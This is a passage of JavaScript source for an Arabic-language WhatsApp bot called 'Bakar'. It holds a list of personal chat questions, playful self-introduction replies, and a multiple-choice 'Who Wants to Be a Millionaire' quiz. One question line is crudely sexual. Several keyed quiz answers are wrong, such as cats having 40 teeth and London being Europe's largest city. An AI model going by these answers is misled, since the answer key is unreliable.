  "قد رقمت او احد رقمك؟ ",
  "وش أفضل لعبته بحياتك؟ ",
  "أخر شي اكلته وش هو؟ ",
  "حزنك يبان بملامحك ولا صوتك؟ ",
  "لقيت الشخص اللي يفهمك واللي يقرا افكارك؟ ",
  "فيه شيء م تقدر تسيطر عليه ؟ ",
  "منشن شخص متحلطم م يعجبه شيء؟ ",
"اكتب تاريخ مستحيل تنساه ",
  "شيء مستحيل انك تاكله ؟ ",
  "تحب تتعرف على ناس جدد ولا مكتفي باللي عندك ؟ ",
  "انسان م تحب تتعامل معاه ابداً ؟ ",
  "شيء بسيط تحتفظ فيه؟ ",
  "فُرصه تتمنى لو أُتيحت لك ؟ ",
   "لي بودي ناك اليكس؟ ",
  "شيء مستحيل ترفضه ؟. ",
  "لو زعلت بقوة وش بيرضيك ؟ ",
  "تنام بـ اي مكان ، ولا بس غرفتك ؟ ",
  "ردك المعتاد اذا أحد ناداك ؟ ",
  "مين الي تحب يكون مبتسم دائما ؟ ",
" إحساسك في هاللحظة؟ ",
  "وش اسم اول شخص تعرفت عليه فالتلقرام ؟ ",
  "اشياء صعب تتقبلها بسرعه ؟ ",
  "شيء جميل صار لك اليوم ؟ ",
  "اذا شفت شخص يتنمر على شخص قدامك شتسوي؟ ",
  "يهمك ملابسك تكون ماركة ؟ ",
  "ردّك على شخص قال (أنا بطلع من حياتك)؟. ",
  "مين اول شخص تكلمه اذا طحت بـ مصيبة ؟ ",
  "تشارك كل شي لاهلك ولا فيه أشياء ما تتشارك؟ ",
  "كيف علاقتك مع اهلك؟ رسميات ولا ميانة؟ ",
  "عمرك ضحيت باشياء لاجل شخص م يسوى ؟ ",
"اكتب سطر من اغنية او قصيدة جا فـ بالك ؟ ",
  "شيء مهما حطيت فيه فلوس بتكون مبسوط ؟ ",
  "مشاكلك بسبب ؟ ",
  "نسبه الندم عندك للي وثقت فيهم ؟ ",
  "اول حرف من اسم شخص تقوله? بطل تفكر فيني ابي انام؟ ",
  "اكثر شيء تحس انه مات ف مجتمعنا؟ ",
  "لو صار سوء فهم بينك وبين شخص هل تحب توضحه ولا تخليه كذا  لان مالك خلق توضح ؟ ",
  "كم عددكم بالبيت؟ ",
  "عادي تتزوج من برا القبيلة؟ ",
  "أجمل شي بحياتك وش هو؟ ",
]
    const xeondndavgrfg = ndavgrfg[Math.floor(Math.random() * ndavgrfg.length)]
    bufferndavgrfg = await getBuffer(`https://telegra.ph/file/7cabf05d1e7d5cde7d50b.mp4`)
    let bbnddavgrfg = [
        {buttonId: `ndavgrfg`, buttonText: {displayText: '⦁ تويت آخرا ' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbnddavgrfg, image: bufferndavgrfg, caption: '*◍»* '+ xeondndavgrfg }, {quoted:m})
    break

    case 'بوت': case 'البوت': case 'bot':    
    const ndav =[
'*اسمي  بكار  يا قلبي 🤤💚*',
'*اسمي بكار  يا روحي🙈❤️*',
'*اسمي  بكار  يعمري🌚🌹*',
'*اسمي  بكار  يا قمر 😍♥️*',
'*اسمي  بكار  يامزه 🥺❤️',
'*اسمي  بكار  يعم 😒*',
'*مقولت اسمي بكار في اي 🙄',
'اسمي الكيوت بكار  🌝💘',
'اسمي  بكار  ياحياتي🧸♥️'
]
    const xeondndav = ndav[Math.floor(Math.random() * ndav.length)]
    bufferndav = await getBuffer(`https://telegra.ph/file/895eed0f03b9b14c608fb.jpg`)
    let bbndav = [
        {buttonId: `bakar`, buttonText: {displayText: '𝗕𝗔𝗞𝗔𝗥 😍❤️ ' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbndav, image: bufferndav, caption: ''+ xeondndav }, {quoted:m})
    break

    case 'بكار': case 'botbakar': case 'bakar':    
    const ffffsawwsa =[
'*نعم يروحي 🌚❤️*',
'*نعم يا قلب بكار 🌚❤️*',
'*عوز اي مني 🙂🤔*',
'*موجود يروحي قلبي 😊♥️*',
'*بتشقط وجي ويت 🤪*',
'*ايوا جاي 😹*',
'*يعم هتسحر واجي 😹🤭*',
'*طب متصلي على النبي كدا 🙂🤍*',
'*تع اشرب شاي 🌚❤️*',
'*اي قمر انت 🌚❤️*',
'*اي قلبي 😻🥰*',
'*ياض خش نام 😂💞*',
'*انا بكار احسن البوتات 🌚❤️*',
'*نعم يقلبي 💝*',
'*مالك حبيبى 🥺❤️‍🩹*',
'*مخصماك وبعد عني مش طيقاك 😹*',
'*مبكلمكش 🥺💔*',
'*ثانيه واحده بتشقط وجى 😹🤍*',
'*موجود عايز اى بوشك ده 😒*',
'*شبيك لبيك 👻😹*',
'*نعم يا قلب بكار ♥️*'
]
    const xeondffffsawwsa = ffffsawwsa[Math.floor(Math.random() * ffffsawwsa.length)]
    bufferffffsawwsa = await getBuffer(`https://telegra.ph/file/895eed0f03b9b14c608fb.jpg`)
    let bbakdsddwa = [
        {buttonId: `bakar`, buttonText: {displayText: '𝗕𝗔𝗞𝗔𝗥 😍❤️ ' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbakdsddwa, image: bufferffffsawwsa, caption: ''+ xeondffffsawwsa }, {quoted:m})
    break
//---------- من سيربح المليون ------------\\\ 
//--------- تطوير مطور ليدو باشا ---------\\\\

case 'aginna': case 'المليون': case 'من_سيربح_المليون': {
    XeonBotInc.sendMessage(from, { react: { text: `❤️`, key: m.key }}) 
    let buttons = [
        {buttonId: `r1`, buttonText: {displayText: 'ابدء المستوي الاول من اللعبة 🫶🏻' }, type: 1}
    ]
    let buttonMessage = {
    image: { url: `https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg` },    
    caption: `
⦁ مرحبا بك في لعبة من سيربح المليون 

⦁ اللعبة 3 مستويات عبارة عن اسئلة عامة 

⦁ جاهز يوحش ؟! 😂❤️

	`,
    footer: botname,
    buttons: buttons,
    headerType: 4,
    }
    XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
    }
    break
case 'wwwq':    
    const wsederfrf =[
"*•  للأسف خطأ يا صديقي حظ اوفر المره القادمه 🥺💞*",
"*اجابتك غلط يروحي 🌚❤️*",
"*اجابتك غلط يقلبي 🥺❤️*",
"*غلط اجابتك 🥺❤️*",
"*غلط اجابتك  يعمري 🙂💔*",
]
    const xeondwsederfrf = wsederfrf[Math.floor(Math.random() * wsederfrf.length)]
    bufferwsederfrf = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbwsederfrf = [
        {buttonId: `aginna`, buttonText: {displayText: '⦁ إعادة اللعبه' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbwsederfrf, image: bufferwsederfrf, caption: ''+ xeondwsederfrf }, {quoted:m})
    break
case 'r1':    
    const jjtgrvdss =[
"*☸️ › السوال الاول*\n\n*• ما هي عملة دولة بولاندا ؟*\n",
"*☸️ › السوال الاول*\n\n*• ما هي عملة دولة بولاندا ؟*\n",
]
    const xeondjjtgrvdss = jjtgrvdss[Math.floor(Math.random() * jjtgrvdss.length)]
    bufferjjtgrvdss = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbjjtgrvdss = [
        {buttonId: `wwwq`, buttonText: {displayText: 'الريال' }, type: 1},
		{buttonId: `r2`, buttonText: {displayText: 'الزلوط' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'اليورو' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbjjtgrvdss, image: bufferjjtgrvdss, caption: ''+ xeondjjtgrvdss }, {quoted:m})
    break	
case 'r2':    
    const fefefesasss =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الثاني*\n\n*•  كم ساعة في اليوم ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الثاني*\n\n*•  كم ساعة في اليوم ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الثاني*\n\n*•  كم ساعة في اليوم ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السوال الثاني*\n\n*•  كم ساعة في اليوم ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السوال الثاني*\n\n*•  كم ساعة في اليوم ؟*\n"
]
    const xeondfefefesasss = fefefesasss[Math.floor(Math.random() * fefefesasss.length)]
    bufferfefefesasss = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbfefefesasss = [
        {buttonId: `wwwq`, buttonText: {displayText: '23 ساعه' }, type: 1},
		{buttonId: `r3`, buttonText: {displayText: '24 ساعه' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: '22 ساعه' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbfefefesasss, image: bufferfefefesasss, caption: ''+ xeondfefefesasss }, {quoted:m})
    break
case 'r3':    
    const ggdsdasa =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الثالث*\n\n*•  ما هو اسم المكان الذي يعيش فيه النحل ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الثالث*\n\n*•  ما هو اسم المكان الذي يعيش فيه النحل ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الثالث*\n\n*•  ما هو اسم المكان الذي يعيش فيه النحل ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السوال الثالث*\n\n*•  ما هو اسم المكان الذي يعيش فيه النحل ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السوال الثالث*\n\n*•  ما هو اسم المكان الذي يعيش فيه النحل ؟*\n"
]
    const xeondggdsdasa = ggdsdasa[Math.floor(Math.random() * ggdsdasa.length)]
    bufferggdsdasa = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbggdsdasa = [
        {buttonId: `wwwq`, buttonText: {displayText: 'الشجرة' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'الكهف' }, type: 1},
		{buttonId: `r4`, buttonText: {displayText: 'الخلية' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbggdsdasa, image: bufferggdsdasa, caption: ''+ xeondggdsdasa }, {quoted:m})
    break
case 'r4':    
    const feefsjujuj =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الرابع*\n\n*•  اكمل المثل :- احذر من اللئيم اذا ...........؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الرابع*\n\n*•  اكمل المثل :- احذر من اللئيم اذا ...........؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الرابع*\n\n*•  اكمل المثل :- احذر من اللئيم اذا ...........؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السوال الرابع*\n\n*•  اكمل المثل :- احذر من اللئيم اذا ...........؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السوال الرابع*\n\n*•  اكمل المثل :- احذر من اللئيم اذا ...........؟*\n"
]
    const xeondfeefsjujuj = feefsjujuj[Math.floor(Math.random() * feefsjujuj.length)]
    bufferfeefsjujuj = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbfeefsjujuj = [
        {buttonId: `r5`, buttonText: {displayText: 'اكرمته' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'استضفته' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'اطعمته' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbfeefsjujuj, image: bufferfeefsjujuj, caption: ''+ xeondfeefsjujuj }, {quoted:m})
    break
case 'r5':    
    const ghuuuuuuuyg =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الخامس*\n\n*•  ما هي أكبر مدينة في قارة اوروبا ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الخامس*\n\n*•  ما هي أكبر مدينة في قارة اوروبا ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الخامس*\n\n*•  ما هي أكبر مدينة في قارة اوروبا ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السوال الخامس*\n\n*•  ما هي أكبر مدينة في قارة اوروبا ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السوال الخامس*\n\n*•  ما هي أكبر مدينة في قارة اوروبا ؟*\n"
]
    const xeondghuuuuuuuyg = ghuuuuuuuyg[Math.floor(Math.random() * ghuuuuuuuyg.length)]
    bufferghuuuuuuuyg = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbghuuuuuuuyg = [
        {buttonId: `r6`, buttonText: {displayText: 'لندن ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'قبرص' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'باريس' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbghuuuuuuuyg, image: bufferghuuuuuuuyg, caption: ''+ xeondghuuuuuuuyg }, {quoted:m})
    break
    case 'r6':    
    const ghuuuuu =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال السادس*\n\n*•  ما هي اللغة التي تحتل المركز الخامس كأكثر اللغات المتحدث بها*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال السادس*\n\n*•  ما هي اللغة التي تحتل المركز الخامس كأكثر اللغات المتحدث بها*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال السادس*\n\n*•  ما هي اللغة التي تحتل المركز الخامس كأكثر اللغات المتحدث بها*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السوال السادس*\n\n*•  ما هي اللغة التي تحتل المركز الخامس كأكثر اللغات المتحدث بها*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السوال السادس*\n\n*•  ما هي اللغة التي تحتل المركز الخامس كأكثر اللغات المتحدث بها*\n"
]
    const xeondghuuuuu = ghuuuuu[Math.floor(Math.random() * ghuuuuu.length)]
    bufferghuuuuu = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbghuuuuu = [
        {buttonId: `wwwq`, buttonText: {displayText: 'الفرنسيه' }, type: 1},
		{buttonId: `r7`, buttonText: {displayText: 'العربيه ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'الانجليزيه' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbghuuuuu, image: bufferghuuuuu, caption: ''+ xeondghuuuuu }, {quoted:m})
    break
case 'r7':    
    const grfcswww =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال السابع*\n\n*•  ما هو الاسم الحالي لمدينه القسطنطينيه ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال السابع*\n\n*•  ما هو الاسم الحالي لمدينه القسطنطينيه ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال السابع*\n\n*•  ما هو الاسم الحالي لمدينه القسطنطينيه ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السوال السابع*\n\n*•  ما هو الاسم الحالي لمدينه القسطنطينيه ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السوال السابع*\n\n*•  ما هو الاسم الحالي لمدينه القسطنطينيه ؟*\n"
]
    const xeondgrfcswww = grfcswww[Math.floor(Math.random() * grfcswww.length)]
    buffergrfcswww = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbgrfcswww = [
        {buttonId: `r8`, buttonText: {displayText: 'اسطنبول' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'مدريد ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'انقرا' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbgrfcswww, image: buffergrfcswww, caption: ''+ xeondgrfcswww }, {quoted:m})
    break
case 'r8':    
    const grfcs =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الثامن*\n\n*•  كم عدد الجيوب الانفية داخل جسم الانسان ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الثامن*\n\n*•  كم عدد الجيوب الانفية داخل جسم الانسان ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال الثامن*\n\n*•  كم عدد الجيوب الانفية داخل جسم الانسان ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السوال الثامن*\n\n*•  كم عدد الجيوب الانفية داخل جسم الانسان ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السوال الثامن*\n\n*•  كم عدد الجيوب الانفية داخل جسم الانسان ؟*\n"
]
    const xeondgrfcs = grfcs[Math.floor(Math.random() * grfcs.length)]
    buffergrfcs = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbgrfcs = [
        {buttonId: `wwwq`, buttonText: {displayText: '4 جيب' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: '6 جيب ' }, type: 1},
		{buttonId: `r9`, buttonText: {displayText: '8 جيب' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbgrfcs, image: buffergrfcs, caption: ''+ xeondgrfcs }, {quoted:m})
    break	
case 'r9':    
    const grfcsfegs =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال التاسع*\n\n*•  في أي مدينه تقع ساعة بيج بين الشهيرة ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال التاسع*\n\n*•  في أي مدينه تقع ساعة بيج بين الشهيرة ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السوال التاسع*\n\n*•  في أي مدينه تقع ساعة بيج بين الشهيرة ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السوال التاسع*\n\n*•  في أي مدينه تقع ساعة بيج بين الشهيرة ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السوال التاسع*\n\n*•  في أي مدينه تقع ساعة بيج بين الشهيرة ؟*\n"
]
    const xeondgrfcsfegs = grfcsfegs[Math.floor(Math.random() * grfcsfegs.length)]
    buffergrfcsfegs = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbgrfcsfegs = [
        {buttonId: `wwwq`, buttonText: {displayText: 'امريكا' }, type: 1},
		{buttonId: `r10`, buttonText: {displayText: 'لندن ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'فرنسا' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbgrfcsfegs, image: buffergrfcsfegs, caption: ''+ xeondgrfcsfegs }, {quoted:m})
    break	
case 'r10':    
    const grfcsf =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*•  كم عدد فصول السنة ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*•  كم عدد فصول السنة ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*•  كم عدد فصول السنة ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*•  كم عدد فصول السنة ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*•  كم عدد فصول السنة ؟*\n"
]
    const xeondgrfcsf = grfcsf[Math.floor(Math.random() * grfcsf.length)]
    buffergrfcsf = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbgrfcsf = [
        {buttonId: `wwwq`, buttonText: {displayText: '5 فصول' }, type: 1},
		{buttonId: `r11`, buttonText: {displayText: '4 فصول' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: '3 فصول' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbgrfcsf, image: buffergrfcsf, caption: ''+ xeondgrfcsf }, {quoted:m})
    break
case 'r11':    
    const grfcsfe =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*نجحت في تخطي المستوي الاول يا بطل 🥳😍*\n\n*•  يلا نكمل يبطلي 🤭❤️*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*نجحت في تخطي المستوي الاول يا بطل 🥳😍*\n\n*•  يلا نكمل يبطلي 🤭❤️*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*نجحت في تخطي المستوي الاول يا بطل 🥳😍*\n\n*•  يلا نكمل يبطلي 🤭❤️*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*نجحت في تخطي المستوي الاول يا بطل 🥳😍*\n\n*•  يلا نكمل يبطلي 🤭❤️*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*نجحت في تخطي المستوي الاول يا بطل 🥳😍*\n\n*•  يلا نكمل يبطلي 🤭❤️*\n"
]
    const xeondgrfcsfe = grfcsfe[Math.floor(Math.random() * grfcsfe.length)]
    buffergrfcsfe = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbgrfcsfe = [
		{buttonId: `r12`, buttonText: {displayText: 'انتقل للمستوي الثاني' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbgrfcsfe, image: buffergrfcsfe, caption: ''+ xeondgrfcsfe }, {quoted:m})
    break  
//----------------- مستوي تاتي ------\\

case 'r12':    
    const opikolou =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الاول*\n\n*•  إلي ماذا يشير مصطلح الذهب الاسود ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الاول*\n\n*•  إلي ماذا يشير مصطلح الذهب الاسود ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الاول*\n\n*•  إلي ماذا يشير مصطلح الذهب الاسود ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال الاول*\n\n*•  إلي ماذا يشير مصطلح الذهب الاسود ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال الاول*\n\n*•  إلي ماذا يشير مصطلح الذهب الاسود ؟*\n"
]
    const xeondopikolou = opikolou[Math.floor(Math.random() * opikolou.length)]
    bufferopikolou = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbopikolou = [
        {buttonId: `wwwq`, buttonText: {displayText: 'المنجنيز' }, type: 1},
		{buttonId: `r13`, buttonText: {displayText: 'البترول' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'الفحم' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbopikolou, image: bufferopikolou, caption: ''+ xeondopikolou }, {quoted:m})
    break

case 'r13':    
    const opikolo =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثاني*\n\n*•  الولايات المتحدة الامريكية دولة مميزة وفريدة فما هو شعارها؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثاني*\n\n*•  الولايات المتحدة الامريكية دولة مميزة وفريدة فما هو شعارها؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثاني*\n\n*•  الولايات المتحدة الامريكية دولة مميزة وفريدة فما هو شعارها؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال الثاني*\n\n*•  الولايات المتحدة الامريكية دولة مميزة وفريدة فما هو شعارها؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال الثاني*\n\n*•  الولايات المتحدة الامريكية دولة مميزة وفريدة فما هو شعارها؟*\n"
]
    const xeondopikolo = opikolo[Math.floor(Math.random() * opikolo.length)]
    bufferopikolo = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbopikolo = [
        {buttonId: `wwwq`, buttonText: {displayText: 'الصقر ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'الشعلة' }, type: 1},
		{buttonId: `r14`, buttonText: {displayText: 'النسر ' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbopikolo, image: bufferopikolo, caption: ''+ xeondopikolo }, {quoted:m})
    break
case 'r14':    
    const opik =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثالث*\n\n*•  كم عدد أسنان القط ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثالث*\n\n*•  كم عدد أسنان القط ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثالث*\n\n*•  كم عدد أسنان القط ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال الثالث*\n\n*•  كم عدد أسنان القط ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال الثالث*\n\n*•  كم عدد أسنان القط ؟*\n"
]
    const xeondopik = opik[Math.floor(Math.random() * opik.length)]
    bufferopik = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbopik = [
        {buttonId: `r15`, buttonText: {displayText: '40 سن' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: '60 سن' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: '20 سن' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbopik, image: bufferopik, caption: ''+ xeondopik }, {quoted:m})
    break
case 'r15':    
    const opopikik =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الرابع*\n\n*•  كم قلب للاخطبوط ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الرابع*\n\n*•  كم قلب للاخطبوط ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الرابع*\n\n*•  كم قلب للاخطبوط ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال الرابع*\n\n*•  كم قلب للاخطبوط ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال الرابع*\n\n*•  كم قلب للاخطبوط ؟*\n"
]
    const xeondopopikik = opopikik[Math.floor(Math.random() * opopikik.length)]
    bufferopopikik = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbopopikik = [
        {buttonId: `wwwq`, buttonText: {displayText: '4 قلوب  ' }, type: 1},
		{buttonId: `r16`, buttonText: {displayText: '3 قلوب ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: '5 قلوب' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbopopikik, image: bufferopopikik, caption: ''+ xeondopopikik }, {quoted:m})
    break
case 'r16':    
    const ddaswkkkkk =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الخامس*\n\n*•  أين أفتتح اول متحف في العالم؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الخامس*\n\n*•  أين أفتتح اول متحف في العالم؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الخامس*\n\n*•  أين أفتتح اول متحف في العالم؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال الخامس*\n\n*•  أين أفتتح اول متحف في العالم؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال الخامس*\n\n*•  أين أفتتح اول متحف في العالم؟*\n"
]
    const xeondddaswkkkkk = ddaswkkkkk[Math.floor(Math.random() * ddaswkkkkk.length)]
    bufferddaswkkkkk = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbddaswkkkkk = [
        {buttonId: `wwwq`, buttonText: {displayText: 'انجلترا  ' }, type: 1},
		{buttonId: `r17`, buttonText: {displayText: 'مصر ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'فرنسا' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbddaswkkkkk, image: bufferddaswkkkkk, caption: ''+ xeondddaswkkkkk }, {quoted:m})
    break
case 'r17':    
    const ddaswkk =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال السادس*\n\n*•  ماهي اللغة الرسمية للارجنتين؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال السادس*\n\n*•  ماهي اللغة الرسمية للارجنتين؟*\n",
